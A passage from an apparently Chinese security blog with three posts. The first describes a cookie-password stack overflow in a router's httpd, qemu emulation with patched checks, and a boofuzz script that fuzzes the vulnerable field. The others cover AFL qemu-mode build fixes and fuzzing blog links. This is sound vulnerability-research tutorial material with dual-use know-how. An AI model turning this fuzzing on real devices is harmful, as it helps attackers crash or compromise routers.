<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">websRec</span> &#123;</span></span><br><span class="line">    <span class="type">ringq_t</span>         header;             <span class="comment">/* Header dynamic string */</span></span><br><span class="line">    <span class="type">__time_t</span>            since;              <span class="comment">/* Parsed if-modified-since time */</span></span><br><span class="line">    <span class="type">char</span>*       cgiVars;            <span class="comment">/* CGI standard variables */</span></span><br><span class="line">    <span class="type">char</span>*       cgiQuery;           <span class="comment">/* CGI decoded query string */</span></span><br><span class="line">    <span class="type">__time_t</span>            timestamp;          <span class="comment">/* Last transaction with browser */</span></span><br><span class="line">    <span class="type">int</span>             timeout;            <span class="comment">/* Timeout handle */</span></span><br><span class="line">    <span class="type">char</span>            ipaddr[<span class="number">32</span>];         <span class="comment">/* Connecting ipaddress */</span></span><br><span class="line">    <span class="type">char</span>            type[<span class="number">64</span>];           <span class="comment">/* Mime type */</span></span><br><span class="line">    <span class="type">char</span>            *dir;               <span class="comment">/* Directory containing the page */</span></span><br><span class="line">    <span class="type">char</span>            *path;              <span class="comment">/* Path name without query */</span></span><br><span class="line">    <span class="type">char</span>            *url;               <span class="comment">/* Full request url */</span></span><br><span class="line">    <span class="type">char</span>            *host;              <span class="comment">/* Requested host */</span></span><br><span class="line">    <span class="type">char</span>            *lpath;             <span class="comment">/* Cache local path name */</span></span><br><span class="line">    <span class="type">char</span>            *query;             <span class="comment">/* Request query */</span></span><br><span class="line">    <span class="type">char</span>            *decodedQuery;      <span class="comment">/* Decoded request query */</span></span><br><span class="line">    <span class="type">char</span>            *authType;          <span class="comment">/* Authorization type (Basic/DAA) */</span></span><br><span class="line">    <span class="type">char</span>            *password;          <span class="comment">/* Authorization password */</span></span><br><span class="line">    <span class="type">char</span>            *userName;          <span class="comment">/* Authorization username */</span></span><br><span class="line">    <span class="type">char</span>            *cookie;            <span class="comment">/* Cookie string */</span></span><br><span class="line">    <span class="type">char</span>            *userAgent;         <span class="comment">/* User agent (browser) */</span></span><br><span class="line">    <span class="type">char</span>            *protocol;          <span class="comment">/* Protocol (normally HTTP) */</span></span><br><span class="line">    <span class="type">char</span>            *protoVersion;      <span class="comment">/* Protocol version */</span></span><br><span class="line">    <span class="type">int</span>             sid;                <span class="comment">/* Socket id (handler) */</span></span><br><span class="line">    <span class="type">int</span>             listenSid;          <span class="comment">/* Listen Socket id */</span></span><br><span class="line">    <span class="type">int</span>             port;               <span class="comment">/* Request port number */</span></span><br><span class="line">    <span class="type">int</span>             state;              <span class="comment">/* Current state */</span></span><br><span class="line">    <span class="type">int</span>             flags;              <span class="comment">/* Current flags -- see above */</span></span><br><span class="line">    <span class="type">int</span>             code;               <span class="comment">/* Request result code */</span></span><br><span class="line">    <span class="type">int</span>             clen;               <span class="comment">/* Content length */</span></span><br><span class="line">    <span class="type">int</span>             wid;                <span class="comment">/* Index into webs */</span></span><br><span class="line">    <span class="type">char</span>            *cgiStdin;          <span class="comment">/* filename for CGI stdin */</span></span><br><span class="line">    <span class="type">int</span>             docfd;              <span class="comment">/* Document file descriptor */</span></span><br><span class="line">    <span class="type">int</span>             numbytes;           <span class="comment">/* Bytes to transfer to browser */</span></span><br><span class="line">    <span class="type">int</span>             written;            <span class="comment">/* Bytes actually transferred */</span></span><br><span class="line">    <span class="type">void</span>            (*writeSocket)(<span class="keyword">struct</span> websRec *wp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>漏洞位置：</strong>漏洞位于 <code>R7WebsSecurityHandler</code> 函数中。</p>
<p>注：此文的目的是来熟悉 boofuzz 工具对物联网固件中协议程序的测试流程，暂不介绍如何发现漏洞等。</p>
<p>在函数 <code>sub_2D3F0</code> 中，发现有回调函数注册，这里有一个名称有点奇怪的函数 <code>R7WebsSecurityHandler</code> ，应该是开发者自己开发实现的一个函数。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230905182659104.png" alt="image-20230905182659104"></p>
<p>双击进入该函数定义，并修改参数 a1 为结构体 websRec，修改完后可以看到下边的漏洞点处：</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230905182853340.png" alt="image-20230905182853340"></p>
<p>可以看到，sscanf 函数会从 cookie 字段读取 password 的值，并复制到变量 v33 中，由于 sscanf 没有对复制的长度做检查，从而导致栈溢出。</p>
<h2 id="0x02-仿真环境搭建"><a href="#0x02-仿真环境搭建" class="headerlink" title="0x02 仿真环境搭建"></a>0x02 仿真环境搭建</h2><h3 id="绕过判断条件"><a href="#绕过判断条件" class="headerlink" title="绕过判断条件"></a>绕过判断条件</h3><p>使用以下命令来对 httpd 程序仿真执行，首先进入到固件文件系统 squashfs-root 目录下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cp</span> $(<span class="built_in">which</span> qemu-arm-static) ./</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo <span class="built_in">chroot</span> . ./qemu-arm-static ./bin/httpd</span></span><br></pre></td></tr></table></figure>

<p>这里需要注意的是，我们需要将对应架构的 qemu 程序复制到文件系统目录下，并使用 <code>chroot .</code> 命令来修改根路径。<code>qemu-arm -L ./</code> 也可以达到相同的作用。</p>
<p>尝试运行后，程序会卡在如下界面：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo chroot . ./qemu-arm-static ./bin/httpd</span><br><span class="line">[sudo] guoxb 的密码： </span><br><span class="line">init_core_dump 1784: rlim_cur = 0, rlim_max = -1</span><br><span class="line">init_core_dump 1794: open core dump success</span><br><span class="line">init_core_dump 1803: rlim_cur = 5120, rlim_max = 5120</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Yes:</span><br><span class="line"></span><br><span class="line">      ****** WeLoveLinux****** </span><br><span class="line"></span><br><span class="line"> Welcome to ...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>分析 httpd 的反汇编代码，通过定位字符串 “Welcome to …” ，可以看到位于 <code>sub_2CEA8</code> 函数内，在函数入口处发现调用了 check_network 外部函数，该函数如果返回值为0，则一直处于睡眠状态。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">puts(&quot;\n\nYes:\n\n      ****** WeLoveLinux****** \n\n Welcome to ...&quot;);</span><br><span class="line">sub_2F04C();</span><br><span class="line">while ( check_network(v17) &lt;= 0 )		// 如果验证不通过，就会循环sleep，卡死</span><br><span class="line">  sleep(1u);</span><br><span class="line">v1 = sleep(1u);</span><br><span class="line">if ( ConnectCfm(v1) )</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;	</span><br><span class="line">else									// ConnectCfm不通过，也会报错退出</span><br><span class="line">&#123;</span><br><span class="line">  printf(&quot;connect cfm failed!&quot;);</span><br><span class="line">  v2 = 0;		</span><br><span class="line">&#125;</span><br><span class="line">return v2;</span><br></pre></td></tr></table></figure>

<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230905184914376.png" alt="image-20230905184914376"></p>
<p>比较快捷的方法是对 httpd 程序打 patch，直接绕过判断条件，将 R0 修改为 1 即可绕过。</p>
<p>对 binary 打 patch，不太复杂可以直接通过 hexedit 工具来手工打 patch。修改完运行后，会出现如下报错：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo chroot . ./qemu-arm-static ./bin/httpd</span><br><span class="line">init_core_dump 1784: rlim_cur = 0, rlim_max = -1</span><br><span class="line">init_core_dump 1794: open core dump success</span><br><span class="line">init_core_dump 1803: rlim_cur = 5120, rlim_max = 5120</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Yes:</span><br><span class="line"></span><br><span class="line">      ****** WeLoveLinux****** </span><br><span class="line"></span><br><span class="line"> Welcome to ...</span><br><span class="line">connect: No such file or directory</span><br><span class="line">Connect to server failed.</span><br><span class="line">connect cfm failed!</span><br></pre></td></tr></table></figure>

<p>通过分析代码，可以看到是由于 <code>if ConnectCfm(v1)</code>  处判断未通过导致的，同样，直接对判断条件打 patch。</p>
<p>对于修改后的汇编代码是什么样，可以直接通过 IDA 打patch后查看，也可以通过<a href="http://shell-storm.org/online/Online-Assembler-and-Disassembler/?inst=&arch=arm&as_format=inline#assembly">该网站</a>来在线汇编查看。</p>
<p>打过 patch 后再次运行，可以看到如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[httpd][debug]----------------------------webs.c,157</span><br><span class="line">Unsupported setsockopt level=1 optname=13</span><br><span class="line">httpd listen ip = 255.255.255.255 port = 80</span><br><span class="line">webs: Listening for HTTP requests at address 244.246.254.255</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以明显看到监听的 IP 地址很奇怪，这里是因为没有获取到网卡信息，导致得到了一个随机的 IP 地址，虽然我们成功跑起来了进程，但是还没办法通过宿主机的网卡连接到 httpd。</p>
<h3 id="修复网卡配置信息"><a href="#修复网卡配置信息" class="headerlink" title="修复网卡配置信息"></a>修复网卡配置信息</h3><p>回到 check_network 函数，这是一个外部函数，定义在 libcommon.so 中。这个是如何找到的呢？可以通过之前编写的小工具 searchstring.sh 来搜索文件系统中每个文件中的字符串来查找包含 check_network 的文件，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ bash ./stringsearch.sh check_network</span><br><span class="line">Found &quot;check_network&quot; in file: ./bin/httpd</span><br><span class="line">Found &quot;check_network&quot; in file: ./bin/httpd-new</span><br><span class="line">Found &quot;check_network&quot; in file: ./bin/logserver</span><br><span class="line">Found &quot;check_network&quot; in file: ./bin/multiWAN</span><br><span class="line">Found &quot;check_network&quot; in file: ./bin/netctrl</span><br><span class="line">Found &quot;check_network&quot; in file: ./bin/tendaupload</span><br><span class="line">Found &quot;check_network&quot; in file: ./lib/libcommon.so</span><br><span class="line">Found &quot;check_network&quot; in file: ./usr/sbin/UsbIppCheck</span><br></pre></td></tr></table></figure>

<p>可以看到第 8 行，check_network 存在于 libcommon.so 库文件中。</p>
<p>继续分析可以发现如下函数调用链：check_network-&gt;getLanIfName()-&gt;get_eth_name(0)</p>
<p>其中，get_eth_name 函数也是外部函数，同样用脚本分析，可以发现其位于 libChipApi.so 中：</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230905190649134.png" alt="image-20230905190649134"></p>
<p>参数 a1 为 0，故路由器守护进程 httpd 想要获取的网卡名为 “br0”，直接在宿主机上创建一个该名称的网卡：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo tunctl -t br0 -u $(whoami)        </span><br><span class="line">sudo ifconfig br0 192.168.65.1/24</span><br></pre></td></tr></table></figure>

<p>再次运行，即可看到该进程已经成功获取到网卡的 IP 地址：</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230905190950406.png" alt="image-20230905190950406"></p>
<h2 id="0x03-boofuzz来验证漏洞"><a href="#0x03-boofuzz来验证漏洞" class="headerlink" title="0x03 boofuzz来验证漏洞"></a>0x03 boofuzz来验证漏洞</h2><h3 id="boofuzz-安装"><a href="#boofuzz-安装" class="headerlink" title="boofuzz 安装"></a>boofuzz 安装</h3><p>推荐在虚拟环境中安装运行 boofuzz ：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo apt-get install python3-pip python3-venv build-essential</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">mkdir</span> boofuzz &amp;&amp; <span class="built_in">cd</span> boofuzz</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">python3 -m venv <span class="built_in">env</span></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">source</span> <span class="built_in">env</span>/bin/activate</span></span><br><span class="line">(env) $ pip install -U pip setuptools</span><br><span class="line">(env) $ pip install boofuzz</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">alias</span> python_boofuzz=<span class="string">&#x27;[env_path]/bin/python&#x27;</span> <span class="comment">#也可对程序添加别名来方便使用</span></span></span><br></pre></td></tr></table></figure>

<h3 id="定制-boofuzz-脚本"><a href="#定制-boofuzz-脚本" class="headerlink" title="定制 boofuzz 脚本"></a>定制 boofuzz 脚本</h3><p>根据该报文信息来定制脚本，如下，通过上面的分析，我们主要对 cookie 字段进行fuzz。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> boofuzz <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">IP = <span class="string">&quot;192.168.65.1&quot;</span></span><br><span class="line">PORT = <span class="number">80</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_response</span>(<span class="params">target, fuzz_data_logger, session, *args, **kwargs</span>):</span><br><span class="line">    fuzz_data_logger.log_info(<span class="string">&quot;Checking test case response...&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = target.recv(<span class="number">512</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        fuzz_data_logger.log_fail(<span class="string">&quot;Unable to connect to target. Closing...&quot;</span>)</span><br><span class="line">        target.close()</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#if empty response</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> response:</span><br><span class="line">        fuzz_data_logger.log_fail(<span class="string">&quot;Empty response, target may be hung. Closing...&quot;</span>)</span><br><span class="line">        target.close()</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#remove everything after null terminator, and convert to string</span></span><br><span class="line">    <span class="comment">#response = response[:response.index(0)].decode(&#x27;utf-8&#x27;)</span></span><br><span class="line">    fuzz_data_logger.log_info(<span class="string">&quot;response check...\n&quot;</span> + response.decode())</span><br><span class="line">    target.close()</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    options = &#123;</span></span><br><span class="line"><span class="string">        &quot;start_commands&quot;: [</span></span><br><span class="line"><span class="string">            &quot;sudo chroot /home/lys/Documents/IoT/firmware/_AC15_V15.03.1.16.bin.extracted/squashfs-root ./httpd&quot;</span></span><br><span class="line"><span class="string">        ],</span></span><br><span class="line"><span class="string">        &quot;stop_commands&quot;: [&quot;echo stopping&quot;],</span></span><br><span class="line"><span class="string">        &quot;proc_name&quot;: [&quot;/usr/bin/qemu-arm-static ./httpd&quot;]</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    procmon = ProcessMonitor(&quot;127.0.0.1&quot;, 26002)</span></span><br><span class="line"><span class="string">    procmon.set_options(**options)</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    session = Session(</span><br><span class="line">        target=Target(</span><br><span class="line">            connection=SocketConnection(IP, PORT, proto=<span class="string">&quot;tcp&quot;</span>),</span><br><span class="line">            <span class="comment"># monitors=[procmon]</span></span><br><span class="line">        ),</span><br><span class="line">        post_test_case_callbacks=[check_response],</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    s_initialize(name=<span class="string">&quot;Request&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> s_block(<span class="string">&quot;Request-Line&quot;</span>):</span><br><span class="line">        <span class="comment"># Line 1</span></span><br><span class="line">        s_group(<span class="string">&quot;Method&quot;</span>, [<span class="string">&quot;GET&quot;</span>])</span><br><span class="line">        s_delim(<span class="string">&quot; &quot;</span>, fuzzable=<span class="literal">False</span>, name=<span class="string">&quot;space-1-1&quot;</span>)</span><br><span class="line">        s_string(<span class="string">&quot;/goform/123&quot;</span>, fuzzable=<span class="literal">False</span>)    <span class="comment"># fuzzable 1</span></span><br><span class="line">        s_delim(<span class="string">&quot; &quot;</span>, fuzzable=<span class="literal">False</span>, name=<span class="string">&quot;space-1-2&quot;</span>)</span><br><span class="line">        s_static(<span class="string">&quot;HTTP/1.1&quot;</span>, name=<span class="string">&quot;HTTP_VERSION&quot;</span>)</span><br><span class="line">        s_static(<span class="string">&quot;\r\n&quot;</span>, name=<span class="string">&quot;Request-Line-CRLF-1&quot;</span>)</span><br><span class="line">        <span class="comment"># Line 2</span></span><br><span class="line">        s_static(<span class="string">&quot;Host&quot;</span>)</span><br><span class="line">        s_delim(<span class="string">&quot;: &quot;</span>, fuzzable=<span class="literal">False</span>, name=<span class="string">&quot;space-2-1&quot;</span>)</span><br><span class="line">        s_string(<span class="string">&quot;192.168.0.5&quot;</span>, fuzzable=<span class="literal">False</span>, name=<span class="string">&quot;IP address&quot;</span>)</span><br><span class="line">        s_static(<span class="string">&quot;\r\n&quot;</span>, name=<span class="string">&quot;Request-Line-CRLF-2&quot;</span>)</span><br><span class="line">        <span class="comment"># Line 3</span></span><br><span class="line">        s_static(<span class="string">&quot;Connection&quot;</span>)</span><br><span class="line">        s_delim(<span class="string">&quot;: &quot;</span>, fuzzable=<span class="literal">False</span>, name=<span class="string">&quot;space-3-1&quot;</span>)</span><br><span class="line">        s_string(<span class="string">&quot;keep-alive&quot;</span>, fuzzable=<span class="literal">False</span>, name=<span class="string">&quot;Connection state&quot;</span>)</span><br><span class="line">        s_static(<span class="string">&quot;\r\n&quot;</span>, name=<span class="string">&quot;Request-Line-CRLF-3&quot;</span>)</span><br><span class="line">        <span class="comment"># Line 4</span></span><br><span class="line">        s_static(<span class="string">&quot;Cookie&quot;</span>)</span><br><span class="line">        s_delim(<span class="string">&quot;: &quot;</span>, fuzzable=<span class="literal">False</span>, name=<span class="string">&quot;space-4-1&quot;</span>)</span><br><span class="line">        s_string(<span class="string">&quot;bLanguage&quot;</span>, fuzzable=<span class="literal">False</span>, name=<span class="string">&quot;key-bLanguage&quot;</span>)</span><br><span class="line">        s_delim(<span class="string">&quot;=&quot;</span>, fuzzable=<span class="literal">False</span>)</span><br><span class="line">        s_string(<span class="string">&quot;en&quot;</span>, fuzzable=<span class="literal">False</span>, name=<span class="string">&quot;value-bLanguage&quot;</span>)</span><br><span class="line">        s_delim(<span class="string">&quot;; &quot;</span>, fuzzable=<span class="literal">False</span>)</span><br><span class="line">        s_string(<span class="string">&quot;password&quot;</span>, fuzzable=<span class="literal">False</span>, name=<span class="string">&quot;key-password&quot;</span>)</span><br><span class="line">        s_delim(<span class="string">&quot;=&quot;</span>, fuzzable=<span class="literal">False</span>)</span><br><span class="line">        s_string(<span class="string">&quot;ce24124987jfjekfjlasfdjmeiruw398r&quot;</span>, fuzzable=<span class="literal">True</span>)    <span class="comment"># fuzzable 2</span></span><br><span class="line">        s_static(<span class="string">&quot;\r\n&quot;</span>, name=<span class="string">&quot;Request-Line-CRLF-4&quot;</span>)</span><br><span class="line">        <span class="comment"># over</span></span><br><span class="line">        s_static(<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">        s_static(<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    session.connect(s_get(<span class="string">&quot;Request&quot;</span>))</span><br><span class="line">    session.fuzz()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230905191824941.png" alt="image-20230905191824941"></p>
<p>我们可以看到发现了错误。也可以通过本地地址 <a href="http://localhost:26000来查看fuzz情况。">http://localhost:26000来查看fuzz情况。</a></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230905192102815.png" alt="image-20230905192102815"></p>
<h2 id="0x04-参考博客"><a href="#0x04-参考博客" class="headerlink" title="0x04 参考博客"></a>0x04 参考博客</h2><p>本文目的只是了解boofuzz对IoT中协议软件做fuzz流程，并不针对具体漏洞做详细分析及利用，其他相关内容具体可参考下面博客。</p>
<p><a href="https://p1kk.github.io/2021/03/29/iot/Tenda%20AC15%20CVE-2018-5767%20CVE-2020-10987/">https://p1kk.github.io/2021/03/29/iot/Tenda%20AC15%20CVE-2018-5767%20CVE-2020-10987/</a></p>
<p><a href="https://blog.csdn.net/song_lee/article/details/113800058">https://blog.csdn.net/song_lee/article/details/113800058</a></p>
]]></content>
      <categories>
        <category>FUZZ</category>
      </categories>
  </entry>
  <entry>
    <title>AFLQemu模式</title>
    <url>/2023/09/11/Fuzz/AFLQemu%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="AFL-Qemu模式"><a href="#AFL-Qemu模式" class="headerlink" title="AFL Qemu模式"></a>AFL Qemu模式</h1><p>记录一下安装 AFL Qemu 模式时踩的坑。</p>
<span id="more"></span>

<p>遇到的问题：</p>
<ol>
<li>运行 build 脚本后，提示 libtool 等资源库没有安装</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo ./build_qemu_support.sh</span> </span><br><span class="line">=================================================</span><br><span class="line">AFL binary-only instrumentation QEMU build script</span><br><span class="line">=================================================</span><br><span class="line"></span><br><span class="line">[*] Performing basic sanity checks...</span><br><span class="line">[-] Error: &#x27;libtool&#x27; not found, please install first.</span><br></pre></td></tr></table></figure>

<p>解决办法：<code>sudo apt install libtool-bin</code></p>
<ol start="2">
<li>安装一些软件包时，遇到找不到glib2的错误</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./build_qemu_support.sh</span> </span><br><span class="line">=================================================</span><br><span class="line">AFL binary-only instrumentation QEMU build script</span><br><span class="line">=================================================</span><br><span class="line"></span><br><span class="line">[*] Performing basic sanity checks...</span><br><span class="line">[-] Error: devel version of &#x27;glib2&#x27; not found, please install first.</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo apt install glib2</span></span><br><span class="line">正在读取软件包列表... 完成</span><br><span class="line">正在分析软件包的依赖关系树       </span><br><span class="line">正在读取状态信息... 完成       </span><br><span class="line">E: 无法定位软件包 glib2</span><br></pre></td></tr></table></figure>

<p>解决办法：</p>
<p>查看安装脚本中的报错处的代码，需要在 <code>/usr/include/glib2.0/</code> 或者 <code>/usr/local/include/glib-2.0/</code> 有相关库，代码如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">if [ ! -d &quot;/usr/include/glib-2.0/&quot; -a ! -d &quot;/usr/local/include/glib-2.0/&quot; ]; then</span><br><span class="line"></span><br><span class="line">  echo &quot;[-] Error: devel version of &#x27;glib2&#x27; not found, please install first.&quot;</span><br><span class="line">  exit 1</span><br><span class="line"></span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

<p>通过安装 libgtk2.0-dev 工具解决：<code>sudo apt install libgtk2.0-dev</code></p>
<ol start="3">
<li>qemu下载地址出错，404 not found.</li>
</ol>
<p>解决办法：在脚本中更换qemu地址，目前qemu下载地址为：<a href="https://download.qemu.org/">https://download.qemu.org/</a></p>
<ol start="4">
<li>qemu编译出错</li>
</ol>
<p>编译时出现下面的错误：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">util/memfd.c:40:12: error: static declaration of &#x27;memfd_create&#x27; follows non-static declaration</span><br><span class="line">static int memfd_create(const char *name, unsigned int flags)</span><br><span class="line">         ^~~~~~~~~~~~</span><br><span class="line">In file included from /usr/include/x86_64-linux-gnu/bits/mman-linux.h:115,</span><br><span class="line">              from /usr/include/x86_64-linux-gnu/bits/mman.h:45,</span><br><span class="line">              from /usr/include/x86_64-linux-gnu/sys/mman.h:41,</span><br><span class="line">              from /root/afl-2.52b/qemu_mode/qemu-2.10.0/include/sysemu/os-posix.h:29,</span><br><span class="line">              from /root/afl-2.52b/qemu_mode/qemu-2.10.0/include/qemu/osdep.h:104,</span><br><span class="line">              from util/memfd.c:28:</span><br></pre></td></tr></table></figure>

<p>因为这个qemu版本太老了，现在已经出到 8.x 版本了，AFL用的还是 2.10.0 版本，所以需要自己再打一个patch：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">diff -ru qemu-2.10.0-clean/util/memfd.c qemu-2.10.0/util/memfd.c</span><br><span class="line">--- qemu-2.10.0-clean/util/memfd.c      2018-11-20 18:11:00.170271506 +0100</span><br><span class="line">+++ qemu-2.10.0/util/memfd.c    2018-11-20 18:11:13.398423613 +0100</span><br><span class="line">@@ -37,7 +37,7 @@</span><br><span class="line"> #include &lt;sys/syscall.h&gt;</span><br><span class="line"> #include &lt;asm/unistd.h&gt;</span><br><span class="line"> </span><br><span class="line">-static int memfd_create(const char *name, unsigned int flags)</span><br><span class="line">+int memfd_create(const char *name, unsigned int flags)</span><br><span class="line"> &#123;</span><br><span class="line"> #ifdef __NR_memfd_create</span><br><span class="line">     return syscall(__NR_memfd_create, name, flags);</span><br></pre></td></tr></table></figure>

<p>将上述文件命名为 memfd_create.diff 后，放如 patchs 目录，然后在脚本中打 patch 的地方，新增一行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">patch -p1 &lt;../patches/memfd_create.diff || exit 1</span><br></pre></td></tr></table></figure>

<p>重新运行安装脚本即可。</p>
<p>最后脚本安装成功后会有以下输出：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[+] Build process successful!</span><br><span class="line">[*] Copying binary...</span><br><span class="line">-rwxr-xr-x 1 guoxb guoxb 10981040 Sep  1 04:30 ../afl-qemu-trace</span><br><span class="line">[+] Successfully created &#x27;../afl-qemu-trace&#x27;.</span><br><span class="line">[*] Testing the build...</span><br><span class="line">[+] Instrumentation tests passed. </span><br><span class="line">[+] All set, you can now use the -Q mode in afl-fuzz!</span><br></pre></td></tr></table></figure>

<p>只有第6行显示插桩测试通过后，并且在上一级目录能找到 afl-qemu-trace 文件才算安装成功 AFL 的 qemu 模式。</p>
<p>下面第一个博客中写插桩测试不通过但是也能运行成功，但反正我没有成功。</p>
<h2 id="采用-qemu-模式进行-fuzz"><a href="#采用-qemu-模式进行-fuzz" class="headerlink" title="采用 qemu 模式进行 fuzz"></a>采用 qemu 模式进行 fuzz</h2><p>只需要对目标 binary 文件测试时命令行加上 <code>-Q</code> 参数即可。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">afl-fuzz -i fuzz-in -o fuzz-out -Q ./path/to/binary</span><br></pre></td></tr></table></figure>



<p><strong>注：</strong>我的测试环境是Ubuntu18.04，只出现了上面列出的几种问题，在翻阅博客的时候还看到有其他各种各样的问题，我暂时没遇到，就先不管了，把博客挂在下边，如果后续遇到其他问题可以查阅参考。</p>
<blockquote>
<p>问题解决参考博客：</p>
<p><a href="http://www.gandalf.site/2019/01/aflafl-qemufuzz.html">http://www.gandalf.site/2019/01/aflafl-qemufuzz.html</a></p>
<p><a href="https://blog.csdn.net/qysh123/article/details/114792891%EF%BC%88%E6%88%90%E5%8A%9F%EF%BC%89">https://blog.csdn.net/qysh123/article/details/114792891（成功）</a></p>
<p><a href="https://www.mail-archive.com/debian-bugs-dist@lists.debian.org/msg1643066.html">https://www.mail-archive.com/debian-bugs-dist@lists.debian.org/msg1643066.html</a></p>
</blockquote>
]]></content>
      <categories>
        <category>FUZZ</category>
      </categories>
  </entry>
  <entry>
    <title>Fuzz博客</title>
    <url>/2023/09/21/Fuzz/Fuzz%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<h1 id="Fuzz相关技术博客"><a href="#Fuzz相关技术博客" class="headerlink" title="Fuzz相关技术博客"></a>Fuzz相关技术博客</h1><p>记录在科研学习 Fuzz 过程中遇到的比较好的博客网站</p>
<span id="more"></span>

<h2 id="1-AFL"><a href="#1-AFL" class="headerlink" title="1. AFL"></a>1. AFL</h2><p><a href="https://rk700.github.io/2017/12/28/afl-internals/">AFL内部实现细节小记 - 记事本 (rk700.github.io)</a></p>
<p><a href="https://rk700.github.io/2018/01/04/afl-mutations/">AFL文件变异一览 - 记事本 (rk700.github.io)</a></p>
<p><a href="https://rk700.github.io/2018/02/02/afl-enhancement/">AFL改进小试 - 记事本 (rk700.github.io)</a></p>
<hr>
<p>AFL白皮书：<a href="https://www.jianshu.com/p/9e387c815c1d">https://www.jianshu.com/p/9e387c815c1d</a></p>
<p><a href="https://thepatrickstar.github.io/afl-white-paper/">https://thepatrickstar.github.io/afl-white-paper/</a></p>
<hr>
<p>看雪有毒师傅</p>
<p><a href="https://bbs.kanxue.com/thread-269534.htm">https://bbs.kanxue.com/thread-269534.htm</a></p>
<p><a href="https://bbs.kanxue.com/thread-269536.htm">https://bbs.kanxue.com/thread-269536.htm</a></p>
<p><a href="https://bbs.kanxue.com/thread-269537.htm">https://bbs.kanxue.com/thread-269537.htm</a></p>
<p>Roland师傅</p>
<p><a href="https://bbs.kanxue.com/thread-265973.htm">https://bbs.kanxue.com/thread-265973.htm</a></p>
<p><a href="https://bbs.kanxue.com/thread-265936.htm">https://bbs.kanxue.com/thread-265936.htm</a></p>
<hr>
<p><a href="https://yuanbaoder.gitee.io/posts/fef7.html">https://yuanbaoder.gitee.io/posts/fef7.html</a></p>
<p><a href="https://yuanbaoder.gitee.io/posts/db73.html">https://yuanbaoder.gitee.io/posts/db73.html</a></p>
<hr>
<p>virgin_bits</p>
<p><a href="https://mem2019.github.io/jekyll/update/2019/08/26/AFL-Fuzzer-Notes-2.html">https://mem2019.github.io/jekyll/update/2019/08/26/AFL-Fuzzer-Notes-2.html</a></p>
<hr>
